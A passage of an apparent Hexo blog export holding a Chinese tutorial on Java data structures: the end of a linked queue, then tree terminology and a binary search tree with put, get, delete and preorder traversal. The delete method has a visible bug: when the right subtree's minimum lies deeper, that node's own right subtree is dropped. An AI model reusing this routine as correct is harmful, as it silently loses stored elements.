oldFirst.next;</span><br><span class="line">        N --;</span><br><span class="line">        <span class="comment">// 因为出队列其实是在删除元素，因此如果队列中的元素被删除完了，需要重置 last = null;</span></span><br><span class="line">        <span class="keyword">if</span> (isEmpty())</span><br><span class="line">            last=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> oldFirst.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node node;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyIterator</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.node = head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> node.next != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            node = node.next;</span><br><span class="line">            <span class="keyword">return</span> node.item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-树</title>
    <url>/posts/fdb654f7.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>树是我们计算机中非常重要的一种数据结构，同时使用树这种数据结构，可以描述现实生活中的很多事物，例如家谱、单位的组织架构、等等。<br>树是由n（n&gt;&#x3D;1）个有限结点组成一个具有层次关系的集合。把它叫做“树”，是因为它看起来像一棵倒挂的树，也就是说它是根朝上，而叶朝下的。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142510.png" alt="  "></p>
<blockquote>
<p><strong>树具有以下特点：</strong></p>
<ol>
<li>每个结点有零个或多个子结点；</li>
<li>没有父结点的结点为根结点；</li>
<li>每一个非根结点只有一个父结点；</li>
<li>每个结点及其后代结点整体上可以看做是一棵树，称为当前结点的父结点的一个子树；</li>
</ol>
</blockquote>
<hr>
<h1 id="二、相关术语"><a href="#二、相关术语" class="headerlink" title="二、相关术语"></a>二、相关术语</h1><p><strong>结点的度：</strong><br>一个结点含有的子树的个数称为该结点的度；<br><strong>叶结点：</strong><br>度为0的结点称为叶结点，也可以叫做终端结点<br><strong>分支结点：</strong><br>度不为0的结点称为分支结点，也可以叫做非终端结点<br><strong>结点的层次：</strong><br>从根结点开始，根结点的层次为1，根的直接后继层次为2，以此类推<br><strong>结点的层序编号：</strong><br>将树中的结点，按照从上层到下层，同层从左到右的次序排成一个线性序列，把他们编成连续的自然数。<br><strong>树的度：</strong><br>树中所有结点的度的最大值<br><strong>树的高度(深度)：</strong><br>树中结点的最大层次<br><strong>森林：</strong><br> m（m&gt;&#x3D;0）个互不相交的树的集合，将一颗非空树的根结点删去，树就变成一个森林；给森林增加一个统一的根结点，森林就变成一棵树<br> <strong>孩子结点：</strong><br>一个结点的直接后继结点称为该结点的孩子结点<br><strong>双亲结点(父结点)：</strong><br>一个结点的直接前驱称为该结点的双亲结点<br><strong>兄弟结点：</strong><br>同一双亲结点的孩子结点间互称兄弟结点</p>
<hr>
<h1 id="三、二叉树"><a href="#三、二叉树" class="headerlink" title="三、二叉树"></a>三、二叉树</h1><h2 id="1-相关概念"><a href="#1-相关概念" class="headerlink" title="1. 相关概念"></a>1. 相关概念</h2><p>二叉树就是度不超过2的树(每个结点最多有两个子结点)</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142514.png" alt="  "></p>
<h2 id="2-特殊二叉树"><a href="#2-特殊二叉树" class="headerlink" title="2. 特殊二叉树"></a>2. 特殊二叉树</h2><h3 id="（1）满二叉树"><a href="#（1）满二叉树" class="headerlink" title="（1）满二叉树"></a>（1）满二叉树</h3><p>一个二叉树，如果每一个层的结点树都达到最大值，则这个二叉树就是满二叉树。满二叉树的叶子结点都集中在二叉树的最下一层，并且除叶子结点之外的每个结点度数均为 2。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142536.png" alt="  "></p>
<h3 id="（2）完全二叉树"><a href="#（2）完全二叉树" class="headerlink" title="（2）完全二叉树"></a>（2）完全二叉树</h3><p>叶节点只能出现在最下层和次下层，并且最下面一层的结点都集中在该层最左边的若干位置的二叉树。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142538.png" alt="  "></p>
<h3 id="（3）二叉排序树"><a href="#（3）二叉排序树" class="headerlink" title="（3）二叉排序树"></a>（3）二叉排序树</h3><p>左子树上所有结点的关键字均小于根结点的关键字;右子树上的所有结点的关键字均大于根结点的关键字;左子树和右子树又各是一棵二叉排序树。</p>
<h3 id="（4）平衡二叉树"><a href="#（4）平衡二叉树" class="headerlink" title="（4）平衡二叉树"></a>（4）平衡二叉树</h3><p>树上任一结点的左子树和右子树的深度之差不超过1。</p>
<hr>
<h2 id="3-二叉查找树的创建"><a href="#3-二叉查找树的创建" class="headerlink" title="3.  二叉查找树的创建"></a>3.  二叉查找树的创建</h2><p>二叉查找树是二叉树中一种常用的一种类型。二叉查找树是为了实现快速查找产生的。不过，它不仅支持快速查找，还支持快速插入和删除。这主要归功于二叉查找树的一个特性，那就是树中任一节点，这个节点的左子树的值总是小于这个节点的值，这个节点右子树的值总是大于这个节点的值。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142540.png" alt="  "></p>
<p><strong>二叉查找树API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142543.png" alt="  "></p>
<h3 id="（1）二叉树的结点类"><a href="#（1）二叉树的结点类" class="headerlink" title="（1）二叉树的结点类"></a>（1）二叉树的结点类</h3><p>根据对图的观察，我们发现二叉树其实就是由一个一个的结点及其之间的关系组成的，按照面向对象的思想，我们设计一个结点类来描述结点这个事物。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="comment">// 存储键</span></span><br><span class="line">	<span class="keyword">public</span> Key key;</span><br><span class="line">	<span class="comment">// 存储值</span></span><br><span class="line">	<span class="keyword">private</span> Value value;</span><br><span class="line">	<span class="comment">// 记录左子结点</span></span><br><span class="line">	<span class="keyword">public</span> Node left;</span><br><span class="line">	<span class="comment">// 记录右子结点</span></span><br><span class="line">	<span class="keyword">public</span> Node right;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(Key key, Value value, Node left, Node right)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.key = key;</span><br><span class="line">		<span class="built_in">this</span>.value = value;</span><br><span class="line">		<span class="built_in">this</span>.left = left;</span><br><span class="line">		<span class="built_in">this</span>.right = right;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（2）二叉查找树插入实现"><a href="#（2）二叉查找树插入实现" class="headerlink" title="（2）二叉查找树插入实现"></a>（2）二叉查找树插入实现</h3><blockquote>
<p><strong>插入方法put实现思想：</strong></p>
<ol>
<li>如果当前树中没有任何一个结点，则直接把新结点当做根结点使用</li>
<li>如果当前树不为空，则从根结点开始：</li>
</ol>
<ul>
<li>如果新结点的key小于当前结点的key，则继续找当前结点的左子结点；</li>
<li>如果新结点的key大于当前结点的key，则继续找当前结点的右子结点；</li>
<li>如果新结点的key等于当前结点的key，则树中已经存在这样的结点，替换该结点的value值即可。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向树中添加元素 key-value</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(Key key, Value value)</span> &#123;</span><br><span class="line">	root = put(root, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向指定的树x中添加key-value,并返回添加元素后新的树</span></span><br><span class="line"><span class="keyword">private</span> Node <span class="title function_">put</span><span class="params">(Node x, Key key, Value value)</span> &#123;</span><br><span class="line">	<span class="comment">//如果 x 子树为空，</span></span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		N++;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Node</span>(key,value, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果x子树不为空</span></span><br><span class="line">	<span class="comment">// 比较x结点的键和key的大小：</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">	<span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">//如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">		x.right = put(x.right,key,value);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">		x.left = put(x.left,key,value);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 如果key等于x结点的键，则替换x结点的值为value即可</span></span><br><span class="line">		x.value = value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（3）二叉查找树查询实现"><a href="#（3）二叉查找树查询实现" class="headerlink" title="（3）二叉查找树查询实现"></a>（3）二叉查找树查询实现</h3><blockquote>
<p><strong>查询方法get实现思想：</strong><br>从根节点开始：</p>
<ol>
<li>如果要查询的key小于当前结点的key，则继续找当前结点的左子结点；</li>
<li>如果要查询的key大于当前结点的key，则继续找当前结点的右子结点；</li>
<li>如果要查询的key等于当前结点的key，则树中返回当前结点的value。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询树中指定key对应的value</span></span><br><span class="line"><span class="keyword">public</span> Value <span class="title function_">get</span><span class="params">(Key key)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> get(root,key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从指定的树x中，查找key对应的值</span></span><br><span class="line"><span class="keyword">public</span> Value <span class="title function_">get</span><span class="params">(Node x, Key key)</span> &#123;</span><br><span class="line">	<span class="comment">// x树为null</span></span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// x树不为null</span></span><br><span class="line">	<span class="comment">// 比较key和x结点的键的大小</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">	<span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">		<span class="keyword">return</span> get(x.right,key);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">		<span class="keyword">return</span> get(x.left,key);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 如果key等于x结点的键，就找到了键为key的结点，只需要返回x结点的值即可</span></span><br><span class="line">		<span class="keyword">return</span> x.value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="（4）二叉查找树删除实现"><a href="#（4）二叉查找树删除实现" class="headerlink" title="（4）二叉查找树删除实现"></a>（4）二叉查找树删除实现</h3><blockquote>
<p><strong>删除方法delete实现思想：</strong></p>
<ol>
<li>找到被删除结点；</li>
<li>找到被删除结点右子树中的最小结点minNode</li>
<li>删除右子树中的最小结点</li>
<li>让被删除结点的左子树称为最小结点minNode的左子树，让被删除结点的右子树称为最小结点minNode的右子 树</li>
<li>让被删除结点的父节点指向最小结点minNode</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除树中key对应的value</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Key key)</span> &#123;</span><br><span class="line">	root = delete(root, key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除指定树x中的key对应的value，并返回删除后的新树</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">delete</span><span class="params">(Node x, Key key)</span> &#123;</span><br><span class="line">	<span class="comment">// x树为null</span></span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// x树不为null</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">	<span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">		x.right = delete(x.right,key);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">		x.left = delete(x.left,key);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 如果key等于x结点的键，完成真正的删除结点动作，要删除的结点就是x；</span></span><br><span class="line">		<span class="comment">// 让元素个数-1</span></span><br><span class="line">		N --;</span><br><span class="line">		<span class="comment">// 得找到右子树中最小的结点</span></span><br><span class="line">		<span class="keyword">if</span> (x.right == <span class="literal">null</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> x.left;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x.left == <span class="literal">null</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> x.right;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">Node</span> <span class="variable">minNode</span> <span class="operator">=</span> x.right;</span><br><span class="line">		<span class="type">Node</span> <span class="variable">curNode</span> <span class="operator">=</span> x.right;</span><br><span class="line">		<span class="comment">// 若右结点无左结点，则它就为替换删除结点的结点</span></span><br><span class="line">		<span class="keyword">if</span> (curNode.left == <span class="literal">null</span>)&#123;</span><br><span class="line">			minNode.left = x.left;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// 找到右子树中最小的结点</span></span><br><span class="line">			<span class="keyword">while</span> (curNode.left != <span class="literal">null</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span> (curNode.left.left == <span class="literal">null</span>)&#123;</span><br><span class="line">					<span class="comment">// 找到最小结点</span></span><br><span class="line">					minNode = curNode.left;</span><br><span class="line">					<span class="comment">// 断开此最小结点</span></span><br><span class="line">					curNode.left = <span class="literal">null</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				curNode = curNode.left;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 让x结点的左子树成为minNode的左子树</span></span><br><span class="line">			minNode.left = x.left;</span><br><span class="line">			<span class="comment">// 让x结点的右子树成为minNode的右子树</span></span><br><span class="line">			minNode.right = x.right;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 让x结点的父结点指向minNode</span></span><br><span class="line">		x = minNode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>完整代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>&lt;Key <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;Key&gt;, Value&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录根结点</span></span><br><span class="line">    <span class="keyword">private</span> Node root;</span><br><span class="line">    <span class="comment">// 记录树中元素的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="comment">// 存储键</span></span><br><span class="line">        <span class="keyword">public</span> Key key;</span><br><span class="line">        <span class="comment">// 存储值</span></span><br><span class="line">        <span class="keyword">private</span> Value value;</span><br><span class="line">        <span class="comment">// 记录左子结点</span></span><br><span class="line">        <span class="keyword">public</span> Node left;</span><br><span class="line">        <span class="comment">// 记录右子结点</span></span><br><span class="line">        <span class="keyword">public</span> Node right;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(Key key, Value value, Node left, Node right)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.left = left;</span><br><span class="line">            <span class="built_in">this</span>.right = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取树中元素的个数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向树中添加元素 key-value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(Key key, Value value)</span> &#123;</span><br><span class="line">        root = put(root, key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向指定的树x中添加key-value,并返回添加元素后新的树</span></span><br><span class="line">    <span class="keyword">private</span> Node <span class="title function_">put</span><span class="params">(Node x, Key key, Value value)</span> &#123;</span><br><span class="line">        <span class="comment">//如果 x 子树为空，</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">            N ++;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Node</span>(key,value, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果x子树不为空</span></span><br><span class="line">        <span class="comment">// 比较x结点的键和key的大小：</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">            x.right = put(x.right,key,value);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">            x.left = put(x.left,key,value);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 如果key等于x结点的键，则替换x结点的值为value即可</span></span><br><span class="line">            x.value = value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询树中指定key对应的value</span></span><br><span class="line">    <span class="keyword">public</span> Value <span class="title function_">get</span><span class="params">(Key key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> get(root,key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从指定的树x中，查找key对应的值</span></span><br><span class="line">    <span class="keyword">public</span> Value <span class="title function_">get</span><span class="params">(Node x, Key key)</span> &#123;</span><br><span class="line">        <span class="comment">// x树为null</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// x树不为null</span></span><br><span class="line">        <span class="comment">// 比较key和x结点的键的大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">            <span class="keyword">return</span> get(x.right,key);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">            <span class="keyword">return</span> get(x.left,key);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 如果key等于x结点的键，就找到了键为key的结点，只需要返回x结点的值即可</span></span><br><span class="line">            <span class="keyword">return</span> x.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除树中key对应的value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Key key)</span> &#123;</span><br><span class="line">        root = delete(root, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 删除指定树x中的key对应的value，并返回删除后的新树</span></span><br><span class="line">	<span class="keyword">public</span> Node <span class="title function_">delete</span><span class="params">(Node x, Key key)</span> &#123;</span><br><span class="line">		<span class="comment">// x树为null</span></span><br><span class="line">		<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// x树不为null</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> key.compareTo(x.key);</span><br><span class="line">		<span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="comment">// 如果key大于x结点的键，则继续找x结点的右子树</span></span><br><span class="line">			x.right = delete(x.right,key);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(cmp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="comment">// 如果key小于x结点的键，则继续找x结点的左子树</span></span><br><span class="line">			x.left = delete(x.left,key);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// 如果key等于x结点的键，完成真正的删除结点动作，要删除的结点就是x；</span></span><br><span class="line">			<span class="comment">// 让元素个数-1</span></span><br><span class="line">			N --;</span><br><span class="line">			<span class="comment">// 得找到右子树中最小的结点</span></span><br><span class="line">			<span class="keyword">if</span> (x.right == <span class="literal">null</span>)&#123;</span><br><span class="line">				<span class="keyword">return</span> x.left;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (x.left == <span class="literal">null</span>)&#123;</span><br><span class="line">				<span class="keyword">return</span> x.right;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">Node</span> <span class="variable">minNode</span> <span class="operator">=</span> x.right;</span><br><span class="line">			<span class="type">Node</span> <span class="variable">curNode</span> <span class="operator">=</span> x.right;</span><br><span class="line">			<span class="comment">// 若右结点无左结点，则它就为替换删除结点的结点</span></span><br><span class="line">			<span class="keyword">if</span> (curNode.left == <span class="literal">null</span>)&#123;</span><br><span class="line">				minNode.left = x.left;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="comment">// 找到右子树中最小的结点</span></span><br><span class="line">				<span class="keyword">while</span> (curNode.left != <span class="literal">null</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span> (curNode.left.left == <span class="literal">null</span>)&#123;</span><br><span class="line">						<span class="comment">// 找到最小结点</span></span><br><span class="line">						minNode = curNode.left;</span><br><span class="line">						<span class="comment">// 断开此最小结点</span></span><br><span class="line">						curNode.left = <span class="literal">null</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					curNode = curNode.left;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// 让x结点的左子树成为minNode的左子树</span></span><br><span class="line">				minNode.left = x.left;</span><br><span class="line">				<span class="comment">// 让x结点的右子树成为minNode的右子树</span></span><br><span class="line">				minNode.right = x.right;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 让x结点的父结点指向minNode</span></span><br><span class="line">			x = minNode;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-二叉树的遍历"><a href="#4-二叉树的遍历" class="headerlink" title="4. 二叉树的遍历"></a>4. 二叉树的遍历</h2><p>很多情况下，我们可能需要像遍历数组数组一样，遍历树，从而拿出树中存储的每一个元素，由于树状结构和线性结构不一样，它没有办法从头开始依次向后遍历，所以存在如何遍历，也就是按照什么样的搜索路径进行遍历的问题。<br>        <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142551.png" alt="  "><br>我们把树简单的画作上图中的样子，由一个根节点、一个左子树、一个右子树组成，那么按照根节点什么时候被访问，我们可以把二叉树的遍历分为以下三种方式：<br> <strong>1. 前序遍历；</strong><br>先访问根结点，然后再访问左子树，最后访问右子树<br> <strong>2. 中序遍历；</strong><br>先访问左子树，中间访问根节点，最后访问右子树<br> <strong>3. 后序遍历；</strong><br>先访问左子树，再访问右子树，最后访问根节点</p>
<p>如果我们分别对下面的树使用三种遍历方式进行遍历，得到的结果如下：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142554.png" alt="  "></p>
<h3 id="（1）前序遍历"><a href="#（1）前序遍历" class="headerlink" title="（1）前序遍历"></a>（1）前序遍历</h3><p>我们在（3）中创建的树上，添加前序遍历的API： </p>
<blockquote>
<ul>
<li><code>public Deque&lt;Key&gt; preErgodic()</code>：使用前序遍历，获取整个树中的所有键</li>
<li><code>private void preErgodic(Node x, Deque&lt;Key&gt; keys)</code>：使用前序遍历，把指定树x中的所有键放入到keys队列中</li>
</ul>
</blockquote>
<p>实现过程中，我们通过前序遍历，把,把每个结点的键取出，放入到队列中返回即可。</p>
<blockquote>
<p><strong>实现步骤：</strong></p>
<ol>
<li>把当前结点的key放入到队列中</li>
<li>找到当前结点的左子树，如果不为空，递归遍历左子树</li>
<li>找到当前结点的右子树，如果不为空，递归遍历右子树</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取整个树中所有的键 -- 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> Deque&lt;Key&gt; <span class="title function_">preErgodic</span><span class="params">()</span>&#123;</span><br><span class="line">	Deque&lt;Key&gt; keys = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">	preErgodic(root, keys);</span><br><span class="line">	<span class="keyword">return</span> keys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定树x的所有键，并放到 keys 队列中</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">preErgodic</span><span class="params">(Node x, Deque&lt;Key&gt; keys)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把x结点的key放入到 队列</span></span><br><span class="line">	keys.add(x.key);</span><br><span class="line">	<span class="comment">// 递归遍历x结点的左子树</span></span><br><span class="line">	<span class="keyword">if</span> (x.left != <span class="literal">null</span>)&#123;</span><br><span class="line">		preErgodic(x.left,keys);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 递归遍历x结点的右子树</span></span><br><span class="line">	<span class="keyword">if</span> (x.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">		preErgodic(x.right,keys);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


